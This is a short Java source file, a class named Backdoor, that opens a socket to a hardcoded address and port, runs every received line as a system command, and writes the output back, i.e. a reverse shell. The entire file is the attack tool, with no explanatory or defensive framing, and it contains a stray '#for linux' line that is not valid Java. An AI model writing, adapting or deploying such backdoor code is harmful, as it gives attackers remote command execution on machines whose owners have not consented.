import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;


#for linux 

public class Backdoor {

	public static void main(String[] args)  {

		String ip = "127.0.0.1";
                int port = 5555;
            try {
                Socket so = new Socket(ip,port);
                while(true){
                    BufferedReader r = new BufferedReader(new InputStreamReader(so.getInputStream()));
                    String CMD_hex = r.readLine();
                    Process proc = Runtime.getRuntime().exec(CMD_hex);
                    BufferedReader pr = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                    String line;
                    StringBuilder sb = new StringBuilder();
                    
                    while((line = pr.readLine())!= null){
                    sb.append(line).append("\n");
                    PrintWriter writer = new PrintWriter(so.getOutputStream(),true);
                    writer.println(sb.toString());
                    }
                    
                }
            } catch (IOException ex) {
                System.out.println("Something wrong !!");
               
            }
       
       
	}

}